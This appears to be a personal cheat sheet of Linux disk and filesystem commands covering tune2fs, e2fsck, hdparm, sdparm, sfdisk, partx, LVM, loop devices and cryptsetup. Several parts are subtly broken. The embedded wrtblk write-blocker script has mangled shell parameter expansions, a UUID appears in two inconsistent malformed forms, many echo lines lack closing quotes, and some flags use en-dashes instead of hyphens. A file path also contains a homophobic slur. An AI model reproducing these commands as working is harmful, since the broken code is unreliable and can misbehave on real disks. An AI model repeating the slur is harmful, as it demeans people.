tune2fs -L localdata /dev/hda2		## give the disk a human-readable label
tune2fs -U 

tune2fs ‐l /dev/sdXY | grep "Default mount options:"
tune2fs ‐o acl /dev/sdXY



tune2fs -l /dev/sda1					## Display a list of the superblock’s contents.

tune2fs -m 5%							## Percentage of blocks reserved for privileged users.

tune2fs -o acl /dev/sda1

tune2fs -o debug



tune2fs -O ^has_journal /dev/			## remove the journal altogether:  
tune2fs -j /dev/						## rebuild the journal:

tune2fs -o journal_data					## commit all data to journal before writing to the filesystem.

tune2fs -o journal_data_ordered			## force data to the filesystem before committing metadata to the journal.

tune2fs -o journal_data_writeback		## force data to the filesystem after committing metadata to the journal.

echo "## ==================================================================== ##"
echo "   [+] tune2fs -O - Set or clear the specified filesystem options 		"
echo "                    In the filesystem’s superblock.						"
echo "## ==================================================================== ##"

echo "##-----------------------------------------------------------##"
echo "   [?]	 caret (^) | Clears the option
echo "   [?] plus sign (+) | Sets   the option
echo "##-----------------------------------------------------------##"
echo "   [?] Run e2fsck after changing filetype or sparse_super
echo "##-----------------------------------------------------------##"

tune2fs -O sparse_super /dev/hda1

tune2fs -O dir_index /dev/hda1			## Use B-trees to speed up lookups on large directories.

tune2fs -O filetype /dev/sda


tune2fs -j -J size=512 /dev/hda1				## create a journal of size 512MB:
mke2fs -O journal_dev /dev/hdb2				## create a journal file on a different device
tune2fs -j -J device=/dev/hdb2 /dev/hda1	## use external device for journaling





echo "## ==================================================================== ##"
echo "## =========== Assign A UUID to the new disk with tunefs: ============= ##"
echo "## ==================================================================== ##"
tune2fs -U 79fb806d-4350-564b8c-8bc3-f3bb0c6b56f2 /dev/sdc1		


echo "## ==================================================================== ##"
echo "## ===================== Now mount the new disk: ====================== ##"
echo "## ==================================================================== ##"
mount -U 79fb806d-4350-4b8c-8bc3-f3bb0c6b56f2 /mnt/clonedisk




tune2fs -l /dev/sda | grep "mount options"





echo "##-=================================================================-##"
echo "   [+] Add a journal to this ext2 filesystem, making it an ext3		 "
echo "##-=================================================================-##"
tune2fs -j /dev/sda1 				# Add a journal to this ext2 filesystem, making it a ext3


echo "##-=========================================================================-##"
echo "   [+] Set the number of times the filesystem has been mounted:				 "
echo "##-=========================================================================-##"
echo "##---------------------------------------------------------------------------##"
echo "   [?] If set to a greater value than the max-mount-counts parameter.			 "
echo "       tune2fs will check the filesystem at the next reboot.					 "
echo "##---------------------------------------------------------------------------##"

tune2fs -C 4 /dev/sda1 				# Set the mount count of the filesystem to 4


echo "##-=================================================================-##"
echo "   [+] Set the filesystem to be checked by fsck after 20 mounts		 "
echo "##-=================================================================-##"
tune2fs -c 20 /dev/sda1 			# Set the filesystem to be checked by fsck after 20 mounts


echo "##-==============================================================-##"
echo "   [+] Set the filesystem to be checked by fsck each 15 days		  "
echo "##-==============================================================-##"
tune2fs -i 15d /dev/sda1 			# Set the filesystem to be checked by fsck each 15 days




Set the mount interval and maximum mount count to 0.
Setting interval between checks to 0 seconds
Setting reserved blocks percentage to 0% (0 blocks)

tune2fs -c 0 -i 0 -m 0 /dev/sdb1




echo "##-====================================================-##"
echo "   [+] Display filesystems superblock information		" 
echo "       (e.g. number of mounts, last checks, UUID)			"
echo "##-====================================================-##"
dumpe2fs -h /dev/sda


echo "##-=========================================================================-##"
echo "   [+] Display locations of superblock (primary and backup) of filesystem		 "
echo "##-=========================================================================-##"
dumpe2fs /dev/sda1 | grep -i superblock 

echo "##-==============================================================-##"
echo "   [+] Display blocks that are marked as bad In the filesystem	  "
echo "##-==============================================================-##"
dumpe2fs -b /dev/sda1 					

dumpe2fs /dev/mapper/ | grep UUID


dumpe2fs -h /dev/sda1						## Display filesystems superblock information (e.g. number of mounts, last checks, UUID)

dumpe2fs -b /dev/sda1						# Display blocks that are marked as bad In the filesystem


dumpe2fs /dev/sda1 | grep -i superblock		# Display locations of superblock (primary and backup) of filesystem
dumpe2fs /dev/hda2 | grep superblock


dumpe2fs -x Print block numbers In hexadecimal.


dumpe2fs -o superblock=								## Specify location of the superblock.

dumpe2fs -o blocksize=								## Specify blocksize to use when examining filesystem.






debugfs device 				# Interactive ext2/ext3/ext4 filesystem debugger




echo "##-====================================================================-##"
echo "   [+] debugfs device Interactive ext2/ext3/ext4 filesystem debugger		"
echo "##-====================================================================-##"
debuge2fs -w /dev/sda1 


When the superblock of a partition is damaged, you can specify a different superblock to use:
debugfs -b 1024 -s 8193 /dev/hda1


The information about blocksize and backup superblocks can be found with:
dumpe2fs /dev/hda1




clone /dev/hda1 to hda1.img and display debug information.
partclone.ext3 -c -d -s /dev/hda1 -o hda1.img

restore /dev/hda1 from hda1.img and display debug information.
partclone.extfs -r -d -s hda1.img -o /dev/hda1

restore image from clonezilla(split, gzip,) with stdin source
cat sda1.ext3-ptcl-img.gz.a* | gunzip -c | partclone.ext3 -d -r -s - -o /dev/sda1


grep -c '^processor' /proc/cpuinfo










echo "##-====================================================-##"
echo "   [+] Defrag hard drive - check for fragmentation		"
echo "##-====================================================-##"
e4defrag -c /dev/sda1



echo "##-========================================================-##"
echo "   [+] Run defragger - on hard drive with fragmentation:		"
echo "##-========================================================-##"
e4defrag /dev/sda1








e2label /dev/xvdj1 mydata




UUID=4b0f5600-652f-4466-a4b852ebc752cf62 	/mnt/data	 ext3		defaults0 0



• Defaults • Translates to options rw,suid,dev,exec,auto,nouser,async,relatime












e2fsck -c -f -v /dev/sdd


##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -c					## Check for bad blocks and add them to the badblock list
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -f					## Force checking even if filesystem is marked clean
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -v					## Be verbose
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -d 					## Debugging mode.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -F 					## Flush buffer caches before checking.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -b <superblock>		## Use superblock instead of the default superblock.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -D 					## Optimize directories by reindexing, sorting, 
								## and compressing them where possible
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -j /mnt/journal		## Use the specified external journal file.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -L file				## list bad blocks from a file, instead of checking filesystem for them.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -t 					## Display timing statistics.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
	e2fsck -p 					## “Preen.” Repair all bad blocks noninteractively.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##


e2fsck -d -c -k -v -f /dev/sda


## Search for unreadable blocks ##
badblocks -s /dev/sda


Verbose mode
Show the progress of the scan 
Write the list of bad blocks to the specified file.

badblocks -v -s -o ~/badblocks.txt /dev/sda


badblocks -b block-size device


/usr/share/pci.ids




lshw -short -class disk

lshw --class disk



Lists hardware In a compact format
lshw -short


Lists all disks and storage controllers In the system.
lshw -class disk -class storage

Lists all network interfaces In HTML.
lshw -html -class network



Outputs the device list showing bus information
detailing SCSI, USB, IDE and PCI addresses

lshw -short -businfo



view the storage interfaces, type (SATA, NVME, SCSI):
lshw -class storage


lshw -businfo -class storage

lshw -businfo -class disk













/usr/local/share/pci.ids

       /usr/share/pci.ids

       /etc/pci.ids

       /usr/share/hwdata/pci.ids
              A list of all known PCI IDs (vendors, devices, classes and subclasses).

       /proc/bus/pci/*
              Used to access the configuration of installed PCI busses and devices.

       /proc/ide/*
              Used to access the configuration of installed IDE busses and devices.

       /proc/scsi/*, /dev/sg*
              Used to access the configuration of installed SCSI devices.

       /dev/cpu/*/cpuid
              Used on x86 platforms to access CPU-specific configuration.

       /proc/device-tree/*
              Used on PowerPC platforms to access OpenFirmware configuration.

       /proc/bus/usb/*
              Used to access the configuration of installed USB busses and devices.

       /sys/* Used on 2.6 kernels to access hardware/driver configuration information.









## ====================================================== ##
## ---------------------- hdparm ------------------------ ##
## ====================================================== ##

## ====================================================== ##
## ------------------------------------------------------ ##
 	• cache				#| buffer size In KB
## ------------------------------------------------------ ##
	• capacity			#| number of sectors
## ------------------------------------------------------ ##
 	• driver			#| driver version
## ------------------------------------------------------ ##
 	• geometry			#| physical and logical geometry
## ------------------------------------------------------ ##
	• identify			#| In hexadecimal
## ------------------------------------------------------ ##
	• media				#| media type
## ------------------------------------------------------ ##
	• model				#| manufacturers model number
## ------------------------------------------------------ ##
	• settings			#| drive settings
## ------------------------------------------------------ ##
	• smart_thresholds	#| In hexadecimal
## ------------------------------------------------------ ##
	• smart_values		#| In hexadecimal
## ------------------------------------------------------ ##
## ====================================================== ##



DCO ( Device Configuration Overlay feature set )




echo "## ======================================================== ##"
echo -e "\t [?] To persistantly change drive settings 				"
echo -e "\t         You must modify the file:						"
echo "## ======================================================== ##"
/etc/udev/rules.d/50-hdparm.rules



/lib/udev/rules.d/85-hdparm.rules



/etc/hdparm.conf
cat /etc/hdparm.conf | less



echo "## ==================================================================== ##"
echo "   [+] Display drive information taken directly from the drive itself:    "
echo "## ==================================================================== ##"
echo "## -------------------------------------------------------------------- ##"
echo "   [?] The Asterisk (*) next to udma6 indicates 							"
echo "       that this DMA Form is enabled										"
echo "## -------------------------------------------------------------------- ##"
hdparm -I /dev/sda



view the speed, interface, cache, and rotation about the attached disk
hdparm -I /dev/sda




echo "## ======================================================== ##"
echo -e " [+] Performs & Displays Hard Drive Read Timings:			"
echo "## ======================================================== ##"
hdparm -t /dev/sda



echo "## ======================================================== ##"
echo -e " [+] Performs & Displays Device Cache Read Timings:		"
echo "## ======================================================== ##"
hdparm -T /dev/sda


echo "## ======================================================== ##"
echo -e " [+] Display drive geometry of /dev/hda:					"
echo "          (cylinders, heads, sectors)							"
echo "## ======================================================== ##"
hdparm -g /dev/hda 


echo "## ================================================ ##"
echo "   [+] Display Drive information taken by  			"
echo "       kernel drivers at the system boot time:		"
echo "## ================================================ ##"
hdparm -i /dev/hda 



echo "## ===================================================== ##"
echo -e " [+] Perform benchmarks on the /dev/hda drive:			 "
echo "## ===================================================== ##"
hdparm -tT /dev/hda 




echo "## ============================================= ##"
echo -e " [+] Enable DMA for the device /dev/sda?:		 "
echo "## ============================================= ##"
hdparm -d 1 /dev/sda




hdparm -l


echo "## ========================================================================= ##"
echo "   [+] Reprogram IDE interface chipset of /dev/hda to mode 4. 				"
echo "                  (Use with caution!):										"
echo "## ========================================================================= ##"
hdparm -p 12 /dev/hda 



echo "## ============================================================ ##"
echo -e "\t [+] Check if The Write Cache Back Setting is Enabled:		"
echo -e "\t     Get/set the IDE/SATA drive´s write-caching feature:		"
echo "## ============================================================ ##"
hdparm -W /dev/sda


echo "## ============================================================ ##"
echo -e "\t\t [+] Turn Off The Write Cache Back Setting:				"
echo "## ============================================================ ##"
hdparm -W 0 /dev/sda


echo "## ======================================================================== ##"
echo "   [+] Set the IDE transfer mode for (E)IDE/ATA drives (Sets The DMA):		"
echo "## ======================================================================== ##"
hdparm -X /dev/sda



echo "## ================================================================ ##"
echo "   [+] Read the temperature from some (mostly Hitachi) drives:		"
echo "## ================================================================ ##"
hdparm -H /dev/sda





Tools such as hdparm and blockdev can set 
a disk to read-only by setting a kernel flag

hdparm -r1 /dev/sdk


The same flag can be set with blockdev

blockdev --setro /dev/sdk


https://github.com/msuhanov/Linux-write-blocker/


Maxim Suhanov’s write-blocking kernel patch:


/usr/sbin/wrtblk



#!/bin/sh
# Mark a specified block device as read-only
[ $# -eq 1 ] || exit
[ ! -z "$1" ] || exit
bdev="$1"
[ -b "/dev/$bdev" ] || exit
[ ! -z $bdev##loop*$ ] || exit
blockdev --setro "/dev/$bdev" || logger "wrtblk: blockdev --setro /dev/$bdev
failed!"
# Mark a parent block device as read-only
syspath=$(echo /sys/block/*/"$bdev")
[ "$syspath" = "/sys/block/*/$bdev" ] && exit
dir=$syspath%/*$
parent=$dir##*/$
[ -b "/dev/$parent" ] || exit
blockdev --setro "/dev/$parent" || logger "wrtblk: blockdev --setro /dev/$parent
failed!"





echo "## ================================================ ##"
echo "   [+] Get/set read-only flag for the device:			"
echo "## ================================================ ##"
hdparm -r /dev/sda


echo "## ==================================================================== ##"
echo "   [+] Get/set Write-Read-Verify feature (if the drive supports it): 		"
echo "## ==================================================================== ##"
hdparm -R0 /dev/sda		## (disable) 
hdparm -R1 /dev/sda		## (enable)


--security-help












sdparm - access SCSI modes pages; read VPD pages; send simple SCSI commandsG



Vital Product Data (VPD) 

	• Part Numbers

	• Serial Numbers

	• Code Sets


sdparm is used to control a SCSI devices behavior

	• spin down SCSI drive

	• Alter Drives Write-back Caching





echo "## ============================================================ ##"
echo "   [+] list the common (generic) mode parameters of a disk:		"
echo "## ============================================================ ##"
sdparm /dev/sda


echo "## ================================================================================ ##"
echo "   [+] list the designators within the device identification VPD page of a disk:		"
echo "## ================================================================================ ##"
sdparm --inquiry /dev/sda





echo "## ====================================================================================== ##"
echo "   [+] If the ejection is being prevented by software then that can be overridden with:	  "
echo "## ====================================================================================== ##"
sdparm --command=unlock /dev/sr0




echo "## ======================================================== ##"
echo -e "\t\t [+] Eject The DVD Drive:								"
echo "## ======================================================== ##"
sdparm --command=eject /dev/sr0




echo "## ============================================================================ ##"
echo "   [+] show all the (known) mode page fields for the Matshita DVD/CD drive.		"
echo "## ============================================================================ ##"
sdparm -a CDROM0

sdparm -a -e




echo "## ======================================================================== ##"
echo "   [+] lists out descriptive information about the pages and fields:			"
echo "## ======================================================================== ##"
sdparm --enumerate --all

sdparm --verbose --enumerate --all



echo "## ======================================================== ##"
echo "   [+] Add extra description section to mode page fields		"
echo "## ======================================================== ##"
sdparm -v -e -l




echo "## ============================================================================================ ##"
echo "   [+] The device identification Vital Product Data (VPD) page (0x83) is decoded and output:		"
echo "## ============================================================================================ ##"
sdparm -i
sdparm --inquiry





--get=

--set=



echo "## ======================================================== ##"
echo "   [+] Sets the given mode page to its default values:		"
echo "## ======================================================== ##"
sdparm -D
sdparm --defaults



echo "## ======================================================== ##"
echo "   [+] Rather than trying to decode VPD pages					"
echo "             Print them out In hex:							"
echo "## ======================================================== ##"
sdparm --hex
sdparm -H




echo "## ======================================================== ##"
echo "   [+] re-establish the manufacturers defaults 				"
echo "       and saved values of the caching mode page:				"
echo "## ======================================================== ##"
sdparm --page=ca --defaults --save /dev/sda



echo "## ============================================================= ##"
echo "   [+] list an ATAPI cd/dvd drives common (mode) parameters:		 "
echo "## ============================================================= ##"
sdparm /dev/sr0






echo "## ======================================================================== ##"
echo "   [+] set the "Writeback Cache Enable" bit In the current values page:
echo "## ======================================================================== ##"
sdparm --set=WCE /dev/sda



set the "Writeback Cache Enable" bit In the current and saved values page:

sdparm --set=WCE --save /dev/sda



set the "Writeback Cache Enable" and clear "Read Cache Disable":

sdparm --set=WCE --clear=RCD --save /dev/sda





















fdisk -cul /dev/sda | grep /dev/sda


sfdisk -s /dev/sda


echo ":"
sfdisk -l /dev/sda --show-extended

## fetch the partition table information:
sfdisk -dx /dev/hda > my_disk_partition_info.txt


## full (binary) backup of all sectors where the partition table is stored
sfdisk --backup /dev/sda



## The GPT header can later be restored by:
dd  if=~/sfdisk-sda-0x00000200.bak  of=/dev/sda  seek=$((0x00000200))  bs=1  conv=notrunc




BACKING UP THE PARTITION TABLE

## save a description of the device layout to a text file.
sfdisk --dump /dev/sda > sda.dump

## later restored by:
sfdisk /dev/sda < sda.dump


## creates empty GPT partition table. Note that the --append disables this feature.
echo 'label: gpt' | sfdisk /dev/sdb





echo ":"save the sectors layout with sfdisk:
sfdisk /dev/sda -O hdd-partition-sectors.save


echo ":"recover the old situation with:
sfdisk /dev/hdd -I hdd-partition-sectors.save


$sfdisk=sfdisk --show-size --show-pt-geometry --show-geometry

alias sfdisk="sfdisk --show-size --show-pt-geometry --show-geometry"



sfdisk -d /dev/hda > hda.out
sfdisk /dev/hda < hda.out

sfdisk --dump /dev/sda > sda.dump
sfdisk /dev/sda < sda.dump



sfdisk --backup /dev/sda



## back up or replicate a disk’s partition table"

sfdisk –d /dev/sda > sda-table					## Back up partition table to file
sfdisk /dev/sda < sda-table					## Restore partition table from file
sfdisk –d /dev/sda | sfdisk /dev/sdb			## Copy partition table from disk to disk











echo "## ------------------------------------------------------ ##"
echo "## ====================================================== ##"


echo "## ======================================================== ##"
echo -e "\t [+] List information about all SCSI devices:			"
echo "## ======================================================== ##"
lsscsi 



lsscsi --verbose --list --long --device --size


List the SCSI hosts currently attached to the system
lsscsi --hosts


lsscsi --classic




cat /proc/cpuinfo | grep "^model name" | uniq







echo "## ========================================================= ##"
echo -e "\t [+] Get the block size of the specified partition:		 "

blockdev --getbsz /dev/sda1 




blockdev --getro 

Set read-only  (filesystem already mounted In read-write mode will not be affected)

blockdev --setro /dev/sda1 


blockdev --setrw "$partition"


blockdev --report


blockdev --rereadpt






echo "## ====================================================== ##"
echo -e "\t [+] Show all detected mountable Drives/Partitions/BlockDevices

hwinfo --block --short







echo " [+] Log your PC's motherboard and CPU temperature along with the current date"
echo `date +%m/%d/%y%X |awk '{print $1;}' `" => "` cat /proc/acpi/thermal_zone/THRM/temperature | awk '{print $2, $3;}'` >> datetmp.log

 


 


echo "see all shared filesystems/directories"
showmount --all

partprobe --summary


echo "Lists partition layout..."
parted /dev/sda print				# Lists partition layout on all block devices


echo "Listing partition table(s)"
parted --list                      # lists partition layout on all block devices


findmnt --verbose --all --list --tree 
findmnt --verbose --submounts


findmnt --poll --target /mnt/foo							# Monitors mount, unmount, remount and move on /mnt/foo.
findmnt --poll=umount --first-only --target /mnt/foo		# Waits for /mnt/foo unmount.
findmnt --poll=remount -t ext3 -O ro						# Monitors remounts to read-only mode on all ext3 filesystems.




echo "## ------------------------------------------------------ ##"
echo "   [+] All three commands list partition 3 of /dev/sdb."
echo "## ------------------------------------------------------ ##"
partx --show /dev/sdb3
partx --show --nr 3 /dev/sdb
partx --show /dev/sdb3 /dev/sdb


echo "## ------------------------------------------------------ ##"
echo "   [+] Lists all subpartitions on /dev/sdb3 "
echo "       (the device is used as whole-disk).  "
echo "## ------------------------------------------------------ ##"

partx --show - /dev/sdb3




echo "## ------------------------------------------------------ ##"
echo "   [+] Prints the start sector of partition 5 "
echo "        on /dev/sdb without header.		 	"
echo "## ------------------------------------------------------ ##"

partx -o START -g --nr 5 /dev/sdb



echo "## ------------------------------------------------------ ##"
echo "          [+] Lists the length In sectors and 		 		"
echo "     human-readable size of partition 5 on /dev/sda.			"
echo "## ------------------------------------------------------ ##"
partx -o SECTORS,SIZE /dev/sda5 /dev/sda




echo "## ------------------------------------------------------ ##"
echo "  	[+] Adds all available partitions from"
echo "		    3 to 5 (inclusive) on /dev/sdd."
echo "## ------------------------------------------------------ ##"
partx --add --nr 3:5 /dev/sdd




echo "## ------------------------------------------------------ ##"
echo "   	[+] Removes the last partition on /dev/sdd."
echo "## ------------------------------------------------------ ##"
partx -d --nr :-1 /dev/sdd



fstrim



## echo "## ============================================================== ##"
## echo "   [+] Find out if your server is using shared memory segments	  "
## echo "## ============================================================== ##"




## echo "## ============================================ ##"
## echo "   [+] Get an idea of shared memory settings		"
## echo "## ============================================ ##"





ipcs -m|-q|-s -i <id>



ipcs -lm			## Get an idea of shared memory settings

ipcs -m				## Find out if your server is using shared memory segments









lsipc --global					## Show system-wide usage and limits of IPC resources
lsipc --shmems					## information on the active shared memory segments
lsipc --semaphores				## Write information about active semaphore sets
lsipc --queues					## Write information about active message queues
--list				## 
				## 
				## 


Show full details on just the one resource element identified by id

--id











## ============================================================================= ##
    df --print-type --total --inodes --si --human-readable --all
## ============================================================================= ##
	df -B			# df --block-size=
	df -H			# df --si
	df -t			# df --type=
	df -T			# df --print-type
	df -k			# df --block-size=1K
## ============================================================================= ##


du --apparent-size --block-size=1

du -k . |xdu", "sudo du -k -x / |xdu



sort all of the directories on your system by how much space they are using:

du -cb / | sort -n		## sort programs, then dir by space consumed
 

## ============================================================================= ##
	du --exclude='*.o'
	du -ks * | sort -n -r			## Sort everything by size In kilobytes
	du -cs /home/* | sort -nr		## Show summary, sort results largest to smallest disk
	du -csh /home/*					## human-readable output
	du -Ss /etc						## but not In subdirectories beneath it:
	du -csh							## du --total --summarize --human-readable
	du -sh * 						## du --human-readable --summarize
## ============================================================================= ##
	du -k || --block-size=1K		## equivalent to '--apparent-size --block-size=1K'
	du -m || --block-size=1M		## equivalent to '--apparent-size --block-size=1M'
	du -S || --separate-dirs		## for directories do not include size of subdirectories
	du -P || --no-dereference		## dont follow any symbolic links (this is the default)
	du -b || --bytes				## equivalent to '--apparent-size --block-size=1'
	du -D || --dereference-args		## dereference only symlinks that are listed on the command line
## ============================================================================= ##















/etc/lvm/lvm.conf

>> Logical Volume Management (LVM)
>> partition type 0x8E (Linux LVM)


lvm dumpconfig



## ------------------------------------------------------------------------------------------------- ##
 • Physical volume (PV)  	## A PV is a partition or a disk drive initialized to be used by LVM.
## ------------------------------------------------------------------------------------------------- ##
 • Physical extent (PE)  	## A PE is a small uniform segment of disk space. PVs are split into PEs.
## ------------------------------------------------------------------------------------------------- ##
 • Volume group (VG)  		## A VG is a storage pool, made of one or more PVs.
## ------------------------------------------------------------------------------------------------- ##
 • Logical extent (LE)  	## Every PE is associated with an LE, 
							## and these PEs can be combined into a logical volume.
## ------------------------------------------------------------------------------------------------- ##
 • Logical volume (LV)  	## An LV is a part of a VG and is made of LEs. 
  							## An LV can be formatted with a filesystem and 
						  	## then mounted on the directory of your choice.
## ------------------------------------------------------------------------------------------------- ##



## ------------------------------------------------------------------------------------------------- ##
>> LVM uses the Linux device mapper feature (/dev/mapper)
## ------------------------------------------------------------------------------------------------- ##



## ------------------------------------------------------------------------------------------------- ##
>> A ${Volume Group} (VG) is divided into small fixed-size chunks called ${Physical Extents} (PE)
## ------------------------------------------------------------------------------------------------- ##
>> ${Physical Extents} are mapped one-to-one to ${Logical Extents} (LE)
## ------------------------------------------------------------------------------------------------- ##
>> ${Logical Extents} (LE) are grouped into ${Logical Volumes} (LV) , on which filesystems are created.
## ------------------------------------------------------------------------------------------------- ##



The physical media / partitions a hard disk, or a partition, e.g. /dev/hda, /dev/hda6 or /dev/sda. You should set the
partition types of the disk or partition to 0x8e, which is “Linux LVM”. Partitioning is done using fdisk. Please note that
your version of fdisk may not yet know this type, so it will be listed as “Unknown”. You can turn any consecutive number
of blocks on a block device into a Physical Volume:

Physical Volume (PV) a physical medium with some administrative data added to it. The command pvcreate can be used to
add the administration onto the physical medium. The command vgcreate is used to create a volume group, which consists
of one or more PV’s. A PV that has been grouped in a volume group contains Physical Extents:

Physical Extents (PE) Physical Extents are blocks of diskspace, often several megabytes in size. Using the command lvcreate
you can assign PEs to a Logical Volume:

Logical Volume (LV) A Logical Volume. On a logical volume we can use the command mkfs to get a Filesystem:



pvscan
vgscan
lvscan


lvs -o devices

lvmdiskscan


pvdisplay --columns					## 
pvdisplay --maps					## 



lvm-fullreport
lvmreport


dmeventd
dmsetup
dmstats


lvmetad


lvmconfig


The PV UUID is generated by pvcreate

pvcreate /dev/sdc4 /dev/sde			## 



vgcreate VG0 /dev/xvdf /dev/xvdg

vgdisplay
vgdisplay VG0




checks=1
verify_udev_operations=

raid_fault_policy="warn"
mirror_log_fault_policy="allocate"


backup=1
	backup_dir="/etc/lvm/backup"
verbose=1 

umask=63


metadata_read_only=0


lvmetad




lvmlockctl





dbus-uuidgen


/proc/mounts			## contains filesystem information managed by the kernel





creating and activating an LV snapshot on a CentOS distribution:
-s option denotes that an LV snapshot should be created.
-n 	name of the snapshot
-L option sets the snapshot’s size
# lvcreate -v -L 500m -s -n backup_snapshot /dev/vg00/lvol0


view the LV snapshot
lvdisplay /dev/vg00/lvol0
lvdisplay /dev/vg00/backup_snapshot

mount the LV snapshot as read-only to a temporary
location, as shown here:
# mount -o ro -t ext4 /dev/vg00/backup_snapshot Temp

umount /dev/vg00/backup_snapshot


lvremove /dev/vg00/backup_snapshot







display lvm.conf settings
lvm dumpconfig --type default








echo "## ====================================================== ##"
echo "## ------------- [+] Loop Device Creation: -------------- ##"
echo "## ====================================================== ##"



echo "## ========================================================================= ##"
echo "##----------------- [+] Linux with losetup Method 1 [+] ---------------------##"
echo "##-========================================================================= ##"

##-===============================================================================-##
dd if=/dev/zero of=/usr/vdisk.img bs=1024k count=1024 		# Creates the loop img
##-===============================================================================-##
mkfs.ext3 /usr/vdisk.img				# make a ext3 loop In dev
mount ‐o loop /usr/vdisk.img /mnt		# mount loop In directory
umount /mnt; rm /usr/vdisk.img			# Cleanup unmount and remove
##-===============================================================================-##




echo "## ========================================================================= ##"
echo "##----------------- [+] Linux with losetup Method 2 [+] ---------------------##"
echo "##-========================================================================= ##"


echo "##-================================================================================== ##"
dd if=/dev/urandom of=/usr/vdisk.img bs=1024k count=1024		# Creates the loop img 
echo "##-================================================================================== ##"
losetup /dev/loop0 /usr/vdisk.img	# Creates and associates /dev/loop0 
mkfs.ext3 /dev/loop0 				# make a ext3 loop In dev
mount /dev/loop0 /mnt 			# mount loop on mnt
losetup ‐a                      # Check used loops 
umount /mnt 					# unmount loop
losetup ‐d /dev/loop0           # Detach 
rm /usr/vdisk.img				# remove loop image
#####################################################################################


dd if=/dev/cdrom of=/home/faggot/OS/HardenedBSD.iso bs=2048

dd if=/dev/cdrom of=/home/faggot/OS/Qubes-R3.0-rc1-X86_64.iso bs=2048












# Taking a Disk Snapshot
$ dd if=/dev/hda1 bs=1024 > hda1

## Creating an Empty Image File
$ dd if=/dev/urandom of=/home/bob/safe.img bs=1k count=10024

## Creating a Loop Device
$ losetup /dev/loop0 /home/bob/safe.img

## Creating Encrypted File System
$ cryptsetup -y create safe /dev/loop0

$ cryptsetup -c blowfish -h sha1 create safe /dev/loop0

# status information on your mapped devices.

cryptsetup status safe

# create an ext3 type file

mkfs.ext3 -j /dev/mapper/safe

mkdir /home/bob/safe

mount -t ext3 /dev/mapper/safe /home/bob/safe

















dd if=/dev/zero of=/file bs=1k count=100

losetup -e des /dev/loop0 /file
Password:
Init (up to 16 hex digits):


mkfs -t ext2 /dev/loop0 100
mount -t ext2 /dev/loop0 /mnt
...
umount /dev/loop0
losetup -d /dev/loop0



mount /tmp/disk.img /mnt -t vfat -o loop=/dev/loop

mount /tmp/disk.img /mnt -o loop
              
mount /tmp/disk.img /mnt

mount -t ext3 /tmp/disk.img /mnt









echo "## ====================================================== ##"
echo -e "\t [+] Mount a ISO9660 image file:						  "
echo "## ------------------------------------------------------ ##"
echo "      like a CD-ROM (via the loop device)					  "
echo "## ------------------------------------------------------ ##"
echo "## ====================================================== ##"
mount -t iso9660 -o ro,loop=/dev/loop0 cd.img /mnt/cdrom 





mount ‐t auto /dev/cdrom /mnt/cdrom			## cdrom 
mount /dev/hdc ‐t iso9660 ‐r /cdrom			## IDE
mount /dev/scd0 ‐t iso9660 ‐r /cdrom		## SCSI cdrom
mount /dev/sdc0 ‐t ntfs‐3g /windows			## SCSI




mkdir /mnt/cdrom
mount -o loop,ro /media/kali.iso /mnt/cdrom





CD-ROM filesystem extensions: "
echo "## ====================================== ##"
echo " • Joliet							"
echo " • Rock Ridge						"
echo " • El Torito						"
echo "## ====================================== ##"




Joliet Support The - J option to mkisofs

add support for the UDF fi lesystem by including the - udf


HFS Support To create a disc that includes Mac OS HFS support, add the - hfs option







The standard for bootable discs is known as the El Torito specifi cation.






 
##------------------------------------------------------##"
	mkisofs 		## Create a ISO9660 filesystem
##------------------------------------------------------##"
	mkudffs			## Create a UDF filesystem
##------------------------------------------------------##"
	udffsck 		## Check a UDF filesystem
##------------------------------------------------------##"
	wrudf 			## Maintain a UDF filesystem
##------------------------------------------------------##"
	cdrwtool 		## Manage CD-RW drives
##------------------------------------------------------##"




##------------------------------------------------------------------------------------------------------------------------##"
	♦ El Torito  	|| Used to create bootable CD-ROMs
##------------------------------------------------------------------------------------------------------------------------##"
	♦ MS Joliet  	|| Used to create more MS Windows friendly CD-ROMs
##------------------------------------------------------------------------------------------------------------------------##"
